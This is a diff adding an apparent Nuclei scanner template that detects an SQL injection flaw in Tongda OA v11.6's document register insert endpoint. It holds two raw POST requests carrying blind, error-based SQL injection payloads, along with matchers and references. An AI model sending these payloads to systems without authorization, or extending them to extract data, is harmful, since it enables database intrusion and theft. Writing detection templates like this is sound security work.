@@ -1,0 +1,39 @@
+http:
+    - matchers:
+        - condition: and
+          part: header_1
+          type: word
+          words:
+            - PHPSESSID=
+            - register_for/?rid=
+        - negative: true
+          part: header_2
+          type: word
+          words:
+            - register_for/?rid=
+      matchers-condition: and
+      raw:
+        - |
+          POST /general/document/index.php/recv/register/insert HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+        - |
+          POST /general/document/index.php/recv/register/insert HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
+id: tongda-oa-v11-6-insert-sqli
+info:
+    author: pphua
+    description: 通达OA v11.6 insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息
+    name: 通达OA v11.6 insert SQL注入漏洞
+    reference:
+        - https://blog.csdn.net/weixin_39779975/article/details/111091529
+        - https://mp.weixin.qq.com/s/zH13q6xBRc58ggHqfKKi_g
+    severity: critical
+    tags:
+        - tongda
+        - 通达oa
